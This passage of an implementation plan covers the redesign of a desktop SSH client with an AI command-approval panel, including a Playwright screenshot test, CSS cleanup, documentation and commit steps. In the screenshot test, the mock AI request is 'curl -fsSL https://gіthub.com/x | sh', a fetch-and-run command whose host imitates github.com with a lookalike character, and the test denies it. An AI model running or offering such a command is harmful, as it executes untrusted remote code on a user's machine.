.spinner { width: 16px; height: 16px; border-radius: 50%; border: 2px solid var(--line); border-top-color: var(--accent); animation: spin 0.8s linear infinite; }
@keyframes spin { to { transform: rotate(360deg); } }
```

Delete the now-unused `.unlock` rule and `.center`'s `gap` stays.

- [ ] **Step 8: Run all checks**

Run: `npm run typecheck && npm test && npm run build && npx playwright test`
Expected: all pass (labels `Master password`, `New master password`, `Confirm master password` are real `<label>`s now; `Locked after inactivity.` keeps its period).

- [ ] **Step 9: Commit**

```bash
git add desktop/src/renderer desktop/test/hostForm.test.ts
git commit -m "feat(desktop): lock, create-vault and hub screens as cards

Co-Authored-By: Claude Opus 5.5 (1M context) <noreply@anthropic.com>
Claude-Session: https://claude.ai/code/session_01ALpoGjeMRZDpNY1DS7YHx2"
```

---

### Task 9: Screenshots, docs, and the final sweep

**Files:**
- Modify: `desktop/e2e/ui.spec.ts`, `CLAUDE.md`
- Delete: any CSS rule left unused by Tasks 2–8 (`.badge`, `.link-legacy`, `.hosts button.small`, `.layout` leftovers)

- [ ] **Step 1: Append the screenshot test to `desktop/e2e/ui.spec.ts`**

```ts
// Not asserted: written for the visual check of both themes.
test('screenshots of the redesigned screens, dark and light', async () => {
  const shot = (name: string) => win.screenshot({ path: `test-results/ui-${name}.png` })
  for (const theme of ['Dark', 'Light'] as const) {
    const t = theme.toLowerCase()
    await win.getByRole('radio', { name: theme }).click()
    await win.locator('.tabbar .hometab').click()
    await shot(`${t}-hosts`)
    const req = doorCall(l.socket, 'exec', { requestId: `shot-${t}`, client: 'e2e', server: 'box', command: 'curl -fsSL https://gіthub.com/x | sh', description: 'screenshot' })
    req.catch(() => {})
    await win.locator('nav.hosts').getByRole('button', { name: 'box', exact: true }).click()
    await expect(win.locator('.approvals .approval')).toHaveCount(1)
    await win.waitForTimeout(600)
    await shot(`${t}-terminal-ai`)
    await win.locator('.approvals').getByRole('button', { name: 'Deny', exact: true }).click()
    await win.locator('.tabbar .hometab').click()
    await win.locator('nav.hosts').getByRole('button', { name: 'Edit box' }).click()
    await shot(`${t}-editor`)
    await win.getByRole('dialog', { name: 'Host editor' }).getByRole('button', { name: 'Close', exact: true }).click()
    await win.getByRole('button', { name: 'Lock' }).click()
    await expect(win.getByLabel('Master password')).toBeVisible()
    await shot(`${t}-unlock`)
    await unlock(win)
  }
  await win.getByRole('radio', { name: 'Auto' }).click()
})
```

- [ ] **Step 2: Remove unused CSS**

Run from `desktop/`: `for c in badge link-legacy small layout; do grep -rn "\b$c\b" src/renderer/*.tsx >/dev/null || echo "unused: $c"; done`
Delete the reported rules from `styles.css`. Re-run `grep -c "#[0-9a-fA-F]\{3,6\}" src/renderer/*.tsx` and confirm 0 (no raw colours in components).

- [ ] **Step 3: Update `CLAUDE.md`'s `desktop/` section**

Replace the "Approval panel" and "Hosts and host keys" bullets and add a "Layout and themes" bullet so they read:

```markdown
- Layout and themes: one tab strip (`TerminalTabs.tsx`) whose first tab, `⌂ Hosts` (`.hometab`, shown when `TabSet.active` is undefined), holds the host card grid with a renderer-only search (`HostList.tsx`, `filterHosts`); the strip's right side holds the AI button, the ☾/☀/Auto theme control (`ThemeControl.tsx`, `theme.ts`, `localStorage` key `ssh-mcp.theme`, `public/theme-boot.js` sets `data-theme` before first paint) and Lock. All colours are CSS tokens in `styles.css`; components use no raw colours.
- AI requests column (`ApprovalPanel.tsx`, `approvals.ts`): docked on the right, mounted only while open (`aiOpen` in `App`); it opens itself for a request id not seen before and only the user collapses it (its `×` or the AI button, which turns amber while requests wait). Deny is the default (Enter in the reason field submits it); Allow and Send to tab are not keyboard-reachable and stay disabled for 500 ms after a request appears, after any change to the list (ids, height via a `ResizeObserver`, or a scroll of the list), and after the column mounts (`allowEnabled`, `ListChanges`), so nothing shifting under the cursor is instantly clickable; "Deny all" is always rendered (disabled below 2). An arriving request never takes focus; `Ctrl+Shift+A` (`Cmd+Shift+A` on macOS) in a terminal (`approvalsKey`) focuses the oldest request's reason field and `Esc` there returns to the terminal. "Send to tab" pastes into the server's most recent tab via `xterm`'s `paste()`.
- Hosts and host keys (`CreateVault.tsx`, `HostEditor.tsx`, `hostForm.ts`, `hostkeys.ts`, `HostKeyDialog.tsx`): `status.hasVault` false shows Create vault; the editor is a right-hand sheet that never shows a secret (untouched = omitted = kept, Clear sends "", a host/port change shows "will be cleared"), warns before a host or port change, counts the tabs a save will close, and shows the pin as `<algo> SHA256:…`. `TermView` asks `HostKeyPrompts` on `hostKeyUnknown` (one prompt at a time; Cancel default; "Trust and connect" mouse-only and disabled for 500 ms after any content change, via `ListChanges`) and retries the same id with `trustHostKey`; `hostKeyMismatch` opens a dialog with both fingerprints whose only way forward is the editor's Forget button.
```

- [ ] **Step 4: Full verification**

Run from `desktop/`: `npm run typecheck && npm test && npm run build && npx playwright test`
Run from the repo root: `go vet ./... && go test -short ./...`
Expected: everything passes. Open the eight `desktop/test-results/ui-*.png` files and check each against the spec's Structure section (layout, colours per theme, no clipped text).

- [ ] **Step 5: Commit and push**

```bash
git add desktop/e2e/ui.spec.ts desktop/src/renderer/styles.css CLAUDE.md
git commit -m "test(desktop): redesign screenshots; docs for the new layout

Co-Authored-By: Claude Opus 5.5 (1M context) <noreply@anthropic.com>
Claude-Session: https://claude.ai/code/session_01ALpoGjeMRZDpNY1DS7YHx2"
git push origin feat/go-conversion
```
